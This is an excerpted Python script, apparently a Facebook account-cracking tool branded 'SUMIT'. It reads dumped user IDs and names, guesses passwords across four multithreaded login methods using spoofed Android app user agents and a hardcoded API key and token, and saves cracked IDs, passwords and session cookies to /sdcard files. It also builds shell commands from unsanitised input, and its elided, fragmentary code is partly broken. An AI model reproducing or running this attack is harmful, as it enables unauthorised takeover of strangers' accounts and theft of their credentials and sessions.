...
from concurrent.futures import ThreadPoolExecutor as SUMITSUMIT
from string import * 
...
def randBuildLSB():
    ...
    END = '[FBAN/FB4A;FBAV/258.0.0.36.115;FBBV/46242163;FBDM/{density=1.0,width=1280,height=1920};FBLC/en_PK;FBCR/Nepal_Telecom;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-P5100;FBSV/5.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/137.0.0.6.119;FBBV/17085961;FBDM/{density=3.0,width=1280,height=1440};FBLC/en_GB;FBCR/Nepal_Telecom;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-P5100;FBSV/12.5.3;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)})Dalvik/2.1.0 (Linux; U; Android 11; Philco Smart TV Build/RTM6.230109.239 '+END
    return ua

def randBuildvsskj():
    END = '[FBAN/FB4A;FBAV/173.0.0.28.56;FBBV/47997148;FBDM/{density=2.5,width=720,height=1440};FBLC/en_US;FBCR/Nepal_Telecom;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9500;FBSV/9.3.3;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua

sys.stdout.write('\x1b]2; SUMIT\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
\033[1;93m  
\033[1;94m
\033[1;95m                  SUMIT XETTRY ✅ 
\033[1;37m------------------------------------------------
\033[1;37m Owner    :            SUMIT BHANDARI
\033[1;37m Facebook :            सुमित भण्डारी
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back SUMIT Menu ")
        exit()
...
def SUMIT():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('https://www.facebook.com/N4B1NJ0D?mibextid=ZbWKwL/')
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        SUMIT(allkey)
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[SUMIT] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
"api_key": "882a8490361da98702bf97a021ddc14d"}
    ...
    # 'cookie': 'datr=SES-ZdLTLx68QMNvmR_jDj1n; sb=SES-Zapvy4PwrwFDC-6wRAqX; ps_l=0; ps_n=0; locale=en_GB; vpd=v1%3B669x360x1.8391053676605225; oo=v1; m_pixel_ratio=1.8391053676605225; wd=391x727; fr=0B1P2ki6FvzInIPDK..BlwKxP.3E.AAA.0.0.BlwKxT.AWVv7gwJih0',
    'dpr': '2',
    ...
    'viewport-width': '980',
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);SUMITb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SUMITb};{ckkk}"
                    print(f"\r{R} [SUMIT-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SUMIT_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SUMIT_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [SUMIT-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/SUMIT_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[SUMIT] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [SUMIT-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SUMIT_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SUMIT_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [SUMIT-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[SUMIT] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[SUMIT] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [SUMIT-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SUMIT_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with SUMITSUMIT(max_workers=30) as SUMITworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                SUMITworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                SUMITworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                SUMITworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                SUMITworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/SUMIT.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/SUMIT.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    SUMIT = input('Put File Name :')
    print(" ")
    SUMIT = input('Saving Put File Name :')
    os.system('touch ' +SUMIT)
    os.system('sort -r '+SUMIT+' | uniq > '+SUMIT)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + SUMIT )
    print(47*'-')
    print("File Saved To :" + SUMIT )
    print(47*'-')
    input(f"{S} Press Enter To Back SUMIT Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/SUMIT.txt\n') 
        filepath = input("Put File Name: ")
